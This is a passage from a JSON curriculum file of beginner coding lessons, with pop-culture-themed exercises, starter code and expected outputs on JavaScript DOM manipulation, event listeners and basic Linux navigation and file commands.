reports total gear score","input":"","expected":"Legendary Items Found: 3\nBuffed Gear Roster:\n- Excalibur: 312 power\n- Dragon Plate Armor: 225 power\n- Infinity Gauntlet: 625 power\nTotal Player Gear Score: 1162\nBattle Readiness: RAID READY"}],"usesInput":false,"hasHarness":false}]},{"id":"dom-interactive","title":"DOM & Interactive Web Apps (Capstone)","lessons":[{"id":"dom-selection","number":"5.1","title":"DOM Selection & Text Manipulation","content":"## The Puppeteer's Strings & The Family Tree\n\nWhen a web browser loads your HTML file, it does not just treat it as static text. It converts every single tag, attribute, and sentence into an interactive living tree of JavaScript objects called the **DOM (Document Object Model)**.\n\nThink of JavaScript as the master puppeteer: HTML creates the wooden puppet, and the DOM gives JavaScript the strings to manipulate it in real time!\n\n## Selecting Elements in the Tree\n\nTo change an element, you first have to find it in the tree:\n1. **^document.getElementById('id')^**: Fast and direct. Finds the one element carrying that unique ^id^.\n2. **^document.querySelector('selector')^**: Extremely versatile. Accepts any valid CSS selector (^#id^, ^.class^, or ^tag^).\n\n## Mutating State: textContent & classList\n\nOnce you hold a reference to an element object, you can modify its live state:\n- **^element.textContent^**: Reads or overwrites the text inside the element without reloading the page.\n- **^element.classList.add('new-class')^**: Dynamically applies a CSS styling class!\n\n~~~\nconst heading = document.getElementById('hero-title');\nheading.textContent = 'Welcome to the Multiverse';\nheading.classList.add('highlighted');\n~~~\n\n## Predict & Observe\n\nWhat is the difference between ^textContent^ and ^innerHTML^? ^textContent^ inserts plain text safely, protecting your users against malicious code injection (XSS attacks). In contrast, ^innerHTML^ parses raw HTML strings. Modern developers prefer ^textContent^ whenever updating text!\n\n## Your Task\n\nUsing the simulated web page DOM provided in the editor:\n1. Select the headline using ^document.getElementById('hero-title')^.\n2. Select the mission paragraph using ^document.querySelector('.mission-text')^.\n3. Select the badge using ^document.getElementById('status-badge')^.\n4. Update ^title.textContent = 'Welcome to the Multiverse'^.\n5. Update ^mission.textContent = 'Protect the timeline from temporal anomalies.'^.\n6. Update ^badge.textContent = 'STATUS: ACTIVE'^ and call ^badge.classList.add('badge-online')^.\n7. Print the three lines shown below using ^console.log^.\n\nExpected output:\n\n~~~\nTitle: Welcome to the Multiverse\nMission: Protect the timeline from temporal anomalies.\nBadge: STATUS: ACTIVE [badge-online]\n~~~","starter":"// --- Simulated DOM Environment ---\nclass MockElement {\n  constructor(id = '', className = '', textContent = '') {\n    this.id = id;\n    this.className = className;\n    this.textContent = textContent;\n    this.classList = {\n      add: (cls) => {\n        const set = new Set(this.className ? this.className.split(' ') : []);\n        set.add(cls);\n        this.className = Array.from(set).join(' ');\n      }\n    };\n  }\n}\n\nconst document = {\n  elements: [\n    new MockElement('hero-title', 'title-main', 'Draft Headline'),\n    new MockElement('mission-desc', 'mission-text', 'Draft mission description'),\n    new MockElement('status-badge', '', 'STATUS: PENDING')\n  ],\n  getElementById(id) {\n    return this.elements.find(el => el.id === id) || null;\n  },\n  querySelector(selector) {\n    if (selector.startsWith('#')) return this.getElementById(selector.slice(1));\n    if (selector.startsWith('.')) {\n      const cls = selector.slice(1);\n      return this.elements.find(el => el.className.split(' ').includes(cls)) || null;\n    }\n    return null;\n  }\n};\n// ----------------------------------\n\nfunction updateWebPageDOM() {\n  // TODO: Select hero-title, .mission-text, and status-badge\n  // Update their textContent and add class 'badge-online' to the badge\n\n  const title = null;\n  const mission = null;\n  const badge = null;\n\n  console.log(`Title: ${title ? title.textContent : ''}`);\n  console.log(`Mission: ${mission ? mission.textContent : ''}`);\n  console.log(`Badge: ${badge ? badge.textContent : ''} [${badge ? badge.className : ''}]`);\n}\n\nupdateWebPageDOM();\n","hint":"Use document.getElementById(\"hero-title\"), document.querySelector(\".mission-text\"), and document.getElementById(\"status-badge\"), then update textContent and call badge.classList.add(\"badge-online\").","terms":[{"term":"DOM","def":"Document Object Model; the browser's in-memory object tree representing the loaded HTML page."},{"term":"document","def":"The root JavaScript object representing the webpage and entry point for all DOM operations."},{"term":"getElementById","def":"A DOM method that locates an element matching a specific ^id^ attribute."},{"term":"querySelector","def":"A flexible DOM method that returns the first element matching any CSS selector string."},{"term":"textContent","def":"A property used to safely read or replace the text inside an element."},{"term":"classList","def":"An object property providing methods like ^.add()^ and ^.remove()^ to manipulate an element’s CSS classes."}],"image":{"url":"/diagrams/web/dom-selection.svg","caption":"The Document Object Model tree hierarchy: selecting nodes and updating textContent."},"isUnitTest":false,"fileName":"index.js","tests":[{"name":"Locates DOM elements and updates text and class states","input":"","expected":"Title: Welcome to the Multiverse\nMission: Protect the timeline from temporal anomalies.\nBadge: STATUS: ACTIVE [badge-online]"}],"usesInput":false,"hasHarness":false},{"id":"event-listeners","number":"5.2","title":"Event Listeners & User Interactivity","content":"## The Security Tripwire & Sensor\n\nA web page with HTML and CSS is like a printed poster. To transform it into a responsive app, you need **event listeners**.\n\nThink of an event listener like an infrared security beam or doorbell sensor. You tell the browser: *\"Keep your eyes glued to this button. The moment a user clicks on it, wake me up immediately and run this callback function!\"*\n\n## Registering Click Events\n\nYou wire up an interaction using **^addEventListener()^**:\n\n~~~\nbutton.addEventListener('click', () => {\n  upvotes++;\n  badge.textContent = `${upvotes} upvotes`;\n});\n~~~\n\nThe two key arguments are:\n1. The **event name**: ^'click'^ (or ^'keydown'^, ^'submit'^, ^'input'^).\n2. The **callback function**: The code that runs when the event fires.\n\n## State Drives the UI\n\nInteractive development follows a clean mental cycle:\n1. Store your data in **state variables** (e.g. ^let upvotes = 0^).\n2. When the user interacts, update the state variable.\n3. Update the DOM elements to reflect the new state to the user.\n\n## Your Task\n\nUsing the interactive button environment provided in the editor:\n1. Declare state variables: ^let upvotes = 0;^ and ^let isDarkMode = false;^.\n2. Select ^voteBtn = document.getElementById('upvote-btn')^ and ^countBadge = document.getElementById('vote-count')^.\n3. Select ^themeBtn = document.getElementById('theme-toggle')^.\n4. Add a ^'click'^ listener to ^voteBtn^ that:\n   - Increments ^upvotes += 1^\n   - Sets ^countBadge.textContent = `${upvotes} upvotes`^\n   - Logs: ^[Event] Upvote clicked! Total: ${countBadge.textContent}^\n5. Add a ^'click'^ listener to ^themeBtn^ that:\n   - Toggles ^isDarkMode = !isDarkMode^\n   - Logs: ^[Event] Theme toggled! Dark mode: ${isDarkMode}^\n6. Trigger the sequence of user clicks:\n   - ^voteBtn.click()^\n   - ^voteBtn.click()^\n   - ^themeBtn.click()^\n   - ^voteBtn.click()^\n\nExpected output:\n\n~~~\n[Event] Upvote clicked! Total: 1 upvotes\n[Event] Upvote clicked! Total: 2 upvotes\n[Event] Theme toggled! Dark mode: true\n[Event] Upvote clicked! Total: 3 upvotes\n~~~","starter":"// --- Simulated DOM Event Environment ---\nclass InteractiveElement {\n  constructor(id, textContent = '') {\n    this.id = id;\n    this.textContent = textContent;\n    this.listeners = {};\n  }\n  addEventListener(event, callback) {\n    if (!this.listeners[event]) this.listeners[event] = [];\n    this.listeners[event].push(callback);\n  }\n  click() {\n    (this.listeners['click'] || []).forEach(fn => fn({ target: this, type: 'click' }));\n  }\n}\n\nconst document = {\n  elements: [\n    new InteractiveElement('upvote-btn', 'Upvote Post'),\n    new InteractiveElement('vote-count', '0 upvotes'),\n    new InteractiveElement('theme-toggle', 'Switch Mode')\n  ],\n  getElementById(id) {\n    return this.elements.find(el => el.id === id) || null;\n  }\n};\n// ----------------------------------------\n\nfunction setupAppInteractions() {\n  let upvotes = 0;\n  let isDarkMode = false;\n\n  const voteBtn = document.getElementById('upvote-btn');\n  const countBadge = document.getElementById('vote-count');\n  const themeBtn = document.getElementById('theme-toggle');\n\n  // TODO: Add 'click' event listener to voteBtn\n  // TODO: Add 'click' event listener to themeBtn\n\n  // Simulate user actions:\n  voteBtn.click();\n  voteBtn.click();\n  themeBtn.click();\n  voteBtn.click();\n}\n\nsetupAppInteractions();\n","hint":"Register voteBtn.addEventListener(\"click\", () => { ... }) to increment upvotes and log status, and themeBtn.addEventListener(\"click\", () => { ... }) to toggle isDarkMode.","terms":[{"term":"event","def":"An action or signal occurring in the browser, such as a user mouse click or key press."},{"term":"event listener","def":"A function registered on a DOM node that waits for a specific event type to occur."},{"term":"click event","def":"The event fired when a mouse button is clicked or a screen is tapped on an element."},{"term":"callback","def":"A function passed into ^addEventListener^ to be executed whenever the event occurs."},{"term":"event-driven programming","def":"A programming paradigm where flow is dictated by events like user gestures or incoming messages."},{"term":"UI state","def":"The live data and visual condition of an application interface at any given moment."}],"image":{"url":"/diagrams/web/event-listeners.svg","caption":"Event loop tripwire: Listening for user clicks, executing callbacks, and updating UI state."},"isUnitTest":false,"fileName":"index.js","tests":[{"name":"Dispatches click events and updates UI state smoothly","input":"","expected":"[Event] Upvote clicked! Total: 1 upvotes\n[Event] Upvote clicked! Total: 2 upvotes\n[Event] Theme toggled! Dark mode: true\n[Event] Upvote clicked! Total: 3 upvotes"}],"usesInput":false,"hasHarness":false},{"id":"unit-5-test","number":"5.3","title":"Unit 5 Capstone Test: Interactive Trivia Game & Score Tracker","content":"## Grand Curriculum Capstone: Interactive Trivia Game & Score Tracker\n\nWelcome to the ultimate graduation capstone of the Learn4Free Web Development curriculum! You have journeyed from writing your very first ^<h1>^ LEGO brick to styling responsive Flexbox cards, mastering algorithms, and handling real-time DOM events.\n\nNow bring every single skill together to build a complete, stateful **Interactive Web Trivia Game**.\n\n## Specifications\n\nYou are provided with a questions dataset:\n\n~~~javascript\nconst questions = [\n  {\n    q: 'Which HTML tag defines the highest level headline?',\n    choices: { A: '<p>', B: '<h6>', C: '<h1>', D: '<header>' },\n    correct: 'C'\n  },\n  {\n    q: 'Which CSS property defines the inner spacing inside an element border?',\n    choices: { A: 'margin', B: 'padding', C: 'border-width', D: 'gap' },\n    correct: 'B'\n  },\n  {\n    q: 'Which array method creates a new array by transforming every item?',\n    choices: { A: 'filter', B: 'reduce', C: 'forEach', D: 'map' },\n    correct: 'D'\n  }\n];\n~~~\n\nBuild the Trivia Engine:\n1. Maintain state:\n   - ^score = 0^\n   - ^currentQuestionIndex = 0^\n2. Select DOM elements:\n   - ^scoreBadge = document.getElementById('score-display')^\n   - ^questionBox = document.getElementById('question-text')^\n   - ^feedbackBox = document.getElementById('feedback-message')^\n3. Implement ^answerQuestion(userChoice)^:\n   - Check ^userChoice === question.correct^\n   - If correct:\n     - Add 100 to ^score^\n     - Set ^feedbackBox.textContent = 'Correct! 🎉 (+100 pts)'^\n     - Log: ^Question <qNum>: Correct! 🎉 (+100 pts)^\n   - If incorrect:\n     - Set ^feedbackBox.textContent = 'Incorrect! ❌'^\n     - Log: ^Question <qNum>: Incorrect! ❌^\n   - Update ^scoreBadge.textContent = `Score: ${score}`^\n   - Advance ^currentQuestionIndex++^\n4. After answering all 3 questions with choices ^['C', 'B', 'D']^, print the grand victory banner:\n   ~~~\n   --- TRIVIA GAME OVER ---\n   Final Score: 300 / 300\n   Rank: MASTER WEB DEVELOPER\n   ~~~\n\nExpected output:\n\n~~~\nQuestion 1: Correct! 🎉 (+100 pts)\nQuestion 2: Correct! 🎉 (+100 pts)\nQuestion 3: Correct! 🎉 (+100 pts)\n--- TRIVIA GAME OVER ---\nFinal Score: 300 / 300\nRank: MASTER WEB DEVELOPER\n~~~","starter":"// --- Simulated Trivia App DOM ---\nclass TriviaElement {\n  constructor(id, textContent = '') {\n    this.id = id;\n    this.textContent = textContent;\n  }\n}\n\nconst document = {\n  elements: [\n    new TriviaElement('score-display', 'Score: 0'),\n    new TriviaElement('question-text', 'Ready to start?'),\n    new TriviaElement('feedback-message', '')\n  ],\n  getElementById(id) {\n    return this.elements.find(el => el.id === id) || null;\n  }\n};\n// ---------------------------------\n\nfunction runTriviaGame() {\n  const questions = [\n    {\n      q: 'Which HTML tag defines the highest level headline?',\n      choices: { A: '<p>', B: '<h6>', C: '<h1>', D: '<header>' },\n      correct: 'C'\n    },\n    {\n      q: 'Which CSS property defines the inner spacing inside an element border?',\n      choices: { A: 'margin', B: 'padding', C: 'border-width', D: 'gap' },\n      correct: 'B'\n    },\n    {\n      q: 'Which array method creates a new array by transforming every item?',\n      choices: { A: 'filter', B: 'reduce', C: 'forEach', D: 'map' },\n      correct: 'D'\n    }\n  ];\n\n  // TODO: Implement state tracking, question answering logic, and final game over report\n}\n\nrunTriviaGame();\n","hint":"In answerQuestion, check if userChoice === questions[currentQuestionIndex].correct. If so, add 100 to score and log \"Question <qNum>: Correct! 🎉 (+100 pts)\". Update scoreBadge and increment index.","terms":[{"term":"capstone","def":"A comprehensive culminating project demonstrating unified mastery across an entire curriculum."},{"term":"state management","def":"The systematic handling of dynamic runtime data across application interactions."},{"term":"game loop","def":"The logical cycle evaluating player input, updating state, and rendering UI updates."},{"term":"UI dispatch","def":"Propagating data changes out to visual interface elements in response to events."}],"image":{"url":"/diagrams/web/unit-5-test.svg","caption":"Interactive Trivia Game Engine: Questions, user choices, answer validation, score updates, and victory screen."},"isUnitTest":true,"fileName":"index.js","tests":[{"name":"Plays through all trivia questions, tracks score, and renders final report","input":"","expected":"Question 1: Correct! 🎉 (+100 pts)\nQuestion 2: Correct! 🎉 (+100 pts)\nQuestion 3: Correct! 🎉 (+100 pts)\n--- TRIVIA GAME OVER ---\nFinal Score: 300 / 300\nRank: MASTER WEB DEVELOPER"}],"usesInput":false,"hasHarness":false}]}]},{"id":"linux","title":"Linux & Command Line","language":"Bash","languageId":"linux","description":"Master the command line, filesystem navigation, stream redirection, pipes, permissions, and shell scripting.","units":[{"id":"navigation","title":"Navigation & The Linux Filesystem Tree","lessons":[{"id":"pwd-ls","number":"1.1","title":"Where Am I? pwd and ls","content":"## Concept Hook: The Marauder's Map\n\nIn *Harry Potter*, Harry and Ron don't wander blindly through the sprawling corridors of Hogwarts. Harry pulls out the **Marauder's Map**, taps it with his wand, and utters the charm: *\"I solemnly swear that I am up to no good.\"* Instantly, inked footprints appear, revealing his exact coordinate location in the castle and all nearby doors.\n\nWhen you use the Linux command line, you have no mouse, no desktop icons, and no double-clickable folders. You are standing inside a massive castle of files. Your primary navigational spells are ^pwd^ (your magical GPS) and ^ls^ (your torchlight to inspect the room).\n\n## Plain English: How Files are Organized\n\nEvery file and folder on a computer lives inside a giant upside-down tree called the **filesystem**. The trunk at the very top is called the **root directory**, represented by a single forward slash ^/^. Every folder branch splits off from that root.\n\nWhen you open a terminal, you are always \"standing\" in one specific folder. That location is your **current working directory**.\n\n- ^pwd^ stands for **Print Working Directory**. It prints the complete address from root ^/^ all the way down to where you are standing right now.\n- ^ls^ stands for **List**. It lists the names of every file and folder in your current room.\n- Hidden files in Linux always begin with a period (like ^.marauders_map^). Standard ^ls^ keeps them invisible so they don't clutter your view. Adding the flag ^-a^ (all) tells ^ls -a^ to reveal everything, including hidden dotfiles!\n\n## Pop Culture & Soul\n\nThink of your computer as the Millennium Falcon or the Hogwarts castle. Graphical interfaces hide the engine cables under shiny plastic panels. The Linux terminal lifts the hood and hands you the wrench. When you type commands, you talk directly to the operating system kernel with zero middlemen.\n\n## Code Walkthrough\n\n~~~\n# 1. Step into the hogwarts directory\ncd hogwarts\n\n# 2. Ask the terminal where we are\npwd\n\n# 3. List normal visible files\nls\n\n# 4. List ALL files, including secret dotfiles\nls -a\n~~~\n\n- Line 1: ^cd hogwarts^ walks forward into the folder named ^hogwarts^.\n- Line 2: ^pwd^ prints the full path (e.g. ^/home/student/workspace/hogwarts^).\n- Line 3: ^ls^ prints visible files (^gryffindor.txt^ and ^potions.txt^).\n- Line 4: ^ls -a^ reveals ^.^ (current folder), ^..^ (parent folder), ^.marauders_map^, and the visible files.\n\n## Predict & Observe\n\nWhat do you think happens if you run ^ls^ without ^-a^? You will only see the normal text files. Running ^ls -a^ acts like a blacklight, illuminating the secret ^.marauders_map^ file that was hidden in plain sight.\n\n## Your Task\n\nWrite a bash script in ^script.sh^ that:\n1. Changes directory into the ^hogwarts^ folder using ^cd hogwarts^.\n2. Prints the current working directory using ^pwd^.\n3. Lists visible files using ^ls^.\n4. Lists all files including hidden files using ^ls -a^.","starter":"# Navigation Lesson 1.1: pwd and ls\n# Step into hogwarts and inspect your surroundings\n\n","hint":"First type \"cd hogwarts\", then on new lines call \"pwd\", \"ls\", and \"ls -a\".","terms":[{"term":"command line","def":"A text-based interface where you type instructions for the computer instead of clicking icons."},{"term":"filesystem","def":"The hierarchical tree structure used by an operating system to store and organize files."},{"term":"working directory","def":"The folder you are currently inside within the terminal."},{"term":"pwd","def":"Print Working Directory: outputs the full absolute path of where you are standing."},{"term":"ls","def":"List: displays the names of files and directories in your current location."},{"term":"flag","def":"A modifier starting with a dash (like ^-a^) that changes how a command behaves."},{"term":"hidden file","def":"A file whose name begins with a dot (like ^.config^); hidden from regular ^ls^."}],"image":{"url":"/diagrams/linux/pwd-ls.svg","caption":"Filesystem GPS: pwd outputs your path, ls reveals visible and hidden files"},"isUnitTest":false,"fileName":"script.sh","tests":[{"name":"Inspect hogwarts location and list files","input":"","expected":"/home/student/workspace/hogwarts\ngryffindor.txt\npotions.txt\n.\n..\n.marauders_map\ngryffindor.txt\npotions.txt"}],"usesInput":false,"hasHarness":false},{"id":"cd-paths","number":"1.2","title":"Moving Around: cd and Paths","content":"## Concept Hook: The DeLorean GPS\n\nIn *Back to the Future*, Doc Brown punches exact dates and coordinates into the DeLorean dashboard to travel to precise moments in history. In Linux, an **absolute path** is like dialing exact global coordinates into your navigation computer: no matter where you are in the galaxy, starting with a forward slash ^/^ gives directions from the absolute root of the filesystem.\n\nA **relative path**, on the other hand, is like saying *\"Take two steps back into the hallway, then turn left into the kitchen.\"* It only makes sense relative to where you are standing right now.\n\n## Plain English: Mastering cd, . and ..\n\nThe ^cd^ command stands for **Change Directory**. It is your steering wheel.\n\n- Single dot ^.^ represents **right here** (your current directory).\n- Double dot ^..^ represents **the parent directory** (one floor up).\n- Forward slash ^/^ at the start of a path means the **root directory** (the foundation of the whole disk).\n- Tilde ^~^ is shorthand for your **home directory** (your personal user space).\n\nIf you are standing deep in ^galaxy/sector7/outpost^ and want to travel to ^galaxy/earth^, you don't need to start all the way back from root. You can climb two levels up with ^../..^ and walk straight into ^earth^!\n\n## Pop Culture & Soul\n\nThink of exploring directories like navigating the tunnels of the Death Star or an old-school text adventure game (*\"You are in a maze of twisty little passages, all alike\"*). Learning ^..^ gives you spatial awareness so you never get lost in a server again.\n\n## Code Walkthrough\n\n~~~\n# Step into the deep outpost\ncd galaxy/sector7/outpost\npwd\n\n# Jump two levels up to galaxy, then down into earth\ncd ../../earth\npwd\n\n# List the files in earth\nls\n~~~\n\n- Line 2: Walks three folders deep into ^galaxy/sector7/outpost^.\n- Line 3: Prints the deep outpost path.\n- Line 6: ^cd ../..^ steps out of ^outpost^, out of ^sector7^, and into ^earth^.\n- Line 10: Lists ^mission_control.txt^ inside ^earth^.\n\n## Predict & Observe\n\nWhat would happen if you typed ^cd ..^ when standing at the absolute root ^/^? Root has no parent! Linux simply keeps you at ^/^ without crashing.\n\n## Your Task\n\nWrite a script in ^script.sh^ that:\n1. Navigates into ^galaxy/sector7/outpost^ using ^cd^.\n2. Prints your current path with ^pwd^.\n3. Moves relatively to ^../../earth^ using ^cd ../../earth^.\n4. Prints your new path with ^pwd^.\n5. Lists the files in ^earth^ using ^ls^.","starter":"# Navigation Lesson 1.2: cd and Relative Paths\n# Navigate to the outpost, then use .. to travel to earth\n\n","hint":"Use \"cd galaxy/sector7/outpost\", print with \"pwd\", then \"cd ../../earth\", \"pwd\", and \"ls\".","terms":[{"term":"cd","def":"Change Directory: moves your active terminal session to a different folder."},{"term":"absolute path","def":"A path starting with / that describes a location from the filesystem root."},{"term":"relative path","def":"A path that describes a location starting from your current directory."},{"term":".","def":"A special shortcut referring to the current directory."},{"term":"..","def":"A special shortcut referring to the parent directory (one level up)."},{"term":"~","def":"Tilde shortcut representing the current logged-in user home directory."}],"image":{"url":"/diagrams/linux/cd-paths.svg","caption":"Path Navigation: Absolute paths start at root (/), relative paths use . and .."},"isUnitTest":false,"fileName":"script.sh","tests":[{"name":"Navigate across galaxy directories","input":"","expected":"/home/student/workspace/galaxy/sector7/outpost\n/home/student/workspace/galaxy/earth\nmission_control.txt"}],"usesInput":false,"hasHarness":false},{"id":"mkdir-touch","number":"1.3","title":"Creating Worlds: mkdir and touch","content":"## Concept Hook: Minecraft Foundations\n\nIn *Minecraft*, before you can store enchanted weapons or brew potions, you place cobblestone blocks to build rooms, and you craft empty wooden chests to hold your loot.\n\nIn Linux, you create the digital world from scratch using two simple commands: ^mkdir^ (which constructs new folder rooms) and ^touch^ (which crafts empty files ready for data).\n\n## Plain English: Building Hierarchies\n\n- ^mkdir^ stands for **Make Directory**. Calling ^mkdir photos^ creates a new folder named ^photos^.\n- The ^-p^ flag stands for **parents**. Normally, if you try to create ^station/hangar/bays^ when ^station^ doesn't exist yet, Linux gives an error. Adding ^-p^ tells Linux: *\"Build any missing parent folders along the way without complaining!\"*\n- ^touch^ creates a brand-new, empty file with a size of 0 bytes. (If the file already exists, ^touch^ simply updates its timestamp without modifying its contents).\n\n## Pop Culture & Soul\n\nIn 1993's *Jurassic Park*, Lex Murphy famously sits at the Unix terminal and proclaims: *\"It's a UNIX system! I know this!\"* Knowing how to rapidly conjure nested directory structures and files with one-line bash commands is the superpower behind automated software deployment and server provisioning.\n\n## Code Walkthrough\n\n~~~\n# Create a 3-level folder structure in one swift strike\nmkdir -p station/hangar/bays\n\n# Create two empty ship manifests inside bays\ntouch station/hangar/bays/ship1.txt station/hangar/bays/ship2.txt\n\n# Verify the files exist\nls station/hangar/bays\n~~~\n\n- Line 2: ^mkdir -p^ creates ^station^, creates ^hangar^ inside it, and creates ^bays^ inside that.\n- Line 5: ^touch^ creates both ^ship1.txt^ and ^ship2.txt^ inside ^station/hangar/bays^.\n- Line 8: ^ls station/hangar/bays^ displays both files.\n\n## Predict & Observe\n\nWhat would happen if you omitted the ^-p^ flag when typing ^mkdir station/hangar/bays^ on a blank disk? Linux would abort with: *No such file or directory*, because the parent folders didn't exist yet. Always remember ^-p^ when creating nested paths!\n\n## Your Task\n\nWrite a script in ^script.sh^ that:\n1. Creates the nested directory path ^station/hangar/bays^ using ^mkdir -p^.\n2. Creates two empty files inside that folder: ^ship1.txt^ and ^ship2.txt^ using ^touch^.\n3. Lists the contents of ^station/hangar/bays^ using ^ls station/hangar/bays^.","starter":"# Navigation Lesson 1.3: mkdir and touch\n# Build station/hangar/bays and touch ship1.txt and ship2.txt\n\n","hint":"Run \"mkdir -p station/hangar/bays\", touch both files, then list with \"ls station/hangar/bays\".","terms":[{"term":"mkdir","def":"Make Directory: creates one or more new folders on disk."},{"term":"mkdir -p","def":"Creates intermediate parent directories as needed without throwing an error."},{"term":"touch","def":"Creates a new empty 0-byte file, or updates an existing file timestamp."},{"term":"directory","def":"A folder on disk that contains files and other subdirectories."}],"image":{"url":"/diagrams/linux/mkdir-touch.svg","caption":"Creation Commands: mkdir -p builds directory pyramids, touch creates blank files"},"isUnitTest":false,"fileName":"script.sh","tests":[{"name":"Create nested directories and files","input":"","expected":"ship1.txt\nship2.txt"}],"usesInput":false,"hasHarness":false},{"id":"unit-1-test","number":"1.4","title":"Unit 1 Test: Star Wars Rebel Base Architecture","content":"## The Mission: Yavin 4 Rebel Outpost\n\n**Priority Transmission from General Leia Organa:**\n\n*\"The Galactic Empire has tracked our convoy to the jungle moon of Yavin 4. An Imperial Star Destroyer will enter orbit within minutes. We must establish our underground base directory structure immediately so our flight computers can coordinate the starfighter assault on the Death Star!\"*\n\nYou are the Rebel Alliance's Chief Systems Architect. Prove your mastery of Linux navigation and filesystem construction.\n\n## The Specification\n\nYour automated script must construct the exact organizational architecture required by Alliance High Command:\n\n1. Create two directory branches in a single command using ^mkdir -p^:\n   - ^rebel_base/hangar^\n   - ^rebel_base/command/briefing^\n2. Inside ^rebel_base/hangar^, create two starfighter files using ^touch^:\n   - ^x-wing.txt^\n   - ^y-wing.txt^\n3. Inside ^rebel_base/command/briefing^, create the tactical briefing file:\n   - ^plans.txt^\n4. Change directory into ^rebel_base^ using ^cd rebel_base^.\n5. Print your current location with ^pwd^.\n6. List the contents of ^hangar^ using ^ls hangar^.\n7. List the contents of ^command/briefing^ using ^ls command/briefing^.\n\n## Expected Output\n\nYour script must produce the following terminal output:\n\n~~~\n/home/student/workspace/rebel_base\nx-wing.txt\ny-wing.txt\nplans.txt\n~~~\n\nMay the Force be with you, Commander!","starter":"# Unit 1 Test: Star Wars Rebel Base Architecture\n# Construct the rebel_base tree, touch the fighter files, and verify with pwd and ls\n\n","hint":"Create folders with \"mkdir -p rebel_base/hangar rebel_base/command/briefing\", touch files, \"cd rebel_base\", then \"pwd\", \"ls hangar\", \"ls command/briefing\".","terms":[{"term":"unit test","def":"A comprehensive challenge testing all core concepts learned in the unit."},{"term":"hierarchy","def":"A structured tree of directories and files with parent-child relationships."}],"image":{"url":"/diagrams/linux/unit-1-test.svg","caption":"Unit 1 Test: Build the Yavin 4 Rebel Base filesystem architecture"},"isUnitTest":true,"fileName":"script.sh","tests":[{"name":"Construct Rebel Base filesystem hierarchy","input":"","expected":"/home/student/workspace/rebel_base\nx-wing.txt\ny-wing.txt\nplans.txt"}],"usesInput":false,"hasHarness":false}]},{"id":"file-operations","title":"File Operations & Text Inspection","lessons":[{"id":"cat-head-tail","number":"2.1","title":"Reading Text: cat, head, and tail","content":"## Concept Hook: Movie Credit Rolls\n\nWhen you sit in a movie theater after a Marvel blockbuster, you don't need to read every single caterer, lighting grip, and sound engineer if you only want to see the opening crawl or wait for the secret post-credits teaser scene.\n\nIn Linux, opening a 20-gigabyte database log inside a graphical text editor will freeze your computer. Command-line engineers inspect text with surgical precision: ^head^ shows the opening lines, ^tail^ shows the closing lines, and ^cat^ prints the entire scroll in a flash.\n\n## Plain English: How cat, head, and tail Work\n\n- ^cat^ is short for **concatenate**. It outputs the entire contents of a file from line 1 to the very end directly onto your screen.\n- ^head^ displays the beginning of a file. By default, it prints the first 10 lines. With the ^-n^ flag (number of lines), you can specify exactly how many lines you want (e.g. ^head -n 2 filename^).\n- ^tail^ displays the end of a file. Running ^tail -n 2 filename^ grabs the final 2 lines. In real-world DevOps, engineers run ^tail -f^ to watch web server traffic stream by in real time!\n\n## Pop Culture & Soul\n\nIn *Star Wars*, every saga begins with yellow crawl text disappearing into the stars. If you just need the title and episode number, ^head -n 2^ gives you the story hook without waiting for the whole scroll.\n\n## Code Walkthrough\n\n~~~\n# Inspect the opening crawl lines\nhead -n 2 scroll.txt\n\n# Inspect the final lines of the scroll\ntail -n 2 scroll.txt\n~~~\n\n- Line 2: ^head -n 2 scroll.txt^ grabs only Lines 1 and 2.\n- Line 5: ^tail -n 2 scroll.txt^ grabs only Lines 9 and 10.\n\n## Predict & Observe\n\nWhat happens if you run ^head^ without passing ^-n^? It defaults to showing the first 10 lines. The ^-n^ option lets you customize the exact line count.\n\n## Your Task\n\nWrite a script in ^script.sh^ that:\n1. Prints the first 2 lines of ^scroll.txt^ using ^head -n 2 scroll.txt^.\n2. Prints the last 2 lines of ^scroll.txt^ using ^tail -n 2 scroll.txt^.","starter":"# File Operations Lesson 2.1: cat, head, and tail\n# Inspect the start and end of scroll.txt\n\n","hint":"Run \"head -n 2 scroll.txt\" followed by \"tail -n 2 scroll.txt\".","terms":[{"term":"cat","def":"Concatenate: reads files sequentially and writes their full content to standard output."},{"term":"head","def":"Outputs the first part (head) of files; default is 10 lines."},{"term":"tail","def":"Outputs the last part (tail) of files; useful for reading recent log entries."},{"term":"-n","def":"Flag specifying the exact number of lines to display with head or tail."}],"image":{"url":"/diagrams/linux/cat-head-tail.svg","caption":"Text Inspection: head views top lines, tail views the end, cat dumps all"},"isUnitTest":false,"fileName":"script.sh","tests":[{"name":"Inspect head and tail of movie scroll","input":"","expected":"Line 1: A long time ago in a galaxy far, far away...\nLine 2: Episode IV: A NEW HOPE\nLine 9: Pursued by the Empire's sinister agents, Princess Leia races home\nLine 10: custodian of the stolen plans that can save her people and restore freedom to the galaxy..."}],"usesInput":false,"hasHarness":false},{"id":"cp-mv-rm","number":"2.2","title":"Manipulating Files: cp, mv, and rm","content":"## Concept Hook: The Bank Heist Toolkit\n\nIn a classic heist film like *Ocean's Eleven* or *Mission: Impossible*, Ethan Hunt needs three essential tools:\n1. A scanner to **clone** the security keycard (^cp^).\n2. A disguise to **relocate** or rename the stolen vault diamonds into a laundry cart (^mv^).\n3. An incinerator to **destroy** the blueprints without leaving any evidence behind (^rm^).\n\nThese three commands (^cp^, ^mv^, ^rm^) form the bedrock of file management in Linux.\n\n## Plain English: Copy, Move, and Remove\n\n- ^cp <source> <dest>^ makes a duplicate copy. The original file remains untouched, and a new identical twin is born. (To copy an entire directory, use ^cp -r^ for recursive).\n- ^mv <source> <dest>^ moves a file to a new location OR renames it if the destination is in the same folder. Unlike copy, ^mv^ does not create a duplicate; it simply updates the file's label.\n- ^rm <file>^ removes (deletes) a file permanently. **Warning:** There is NO Trash Can or Recycle Bin in the Linux command line! When you run ^rm^, those bytes are unlinked immediately.\n\n## Pop Culture & Soul\n\nCommand-line power comes with great responsibility. In Hollywood movies, hackers type furiously and files vanish in seconds. In real life, seasoned Linux sysadmins treat ^rm^ with deep respect because there is no \"Undo\" button.\n\n## Code Walkthrough\n\n~~~\n# 1. Step into the lab\ncd lab\n\n# 2. Duplicate draft.txt to copy.txt\ncp draft.txt copy.txt\n\n# 3. Rename draft.txt to final.txt\nmv draft.txt final.txt\n\n# 4. Shred the duplicate copy.txt\nrm copy.txt\n\n# 5. List what remains\nls\n~~~\n\n- Line 5: ^cp draft.txt copy.txt^ creates a duplicate.\n- Line 8: ^mv draft.txt final.txt^ renames the original draft to final.\n- Line 11: ^rm copy.txt^ deletes the twin.\n- Line 14: ^ls^ shows only ^archive^ and ^final.txt^ 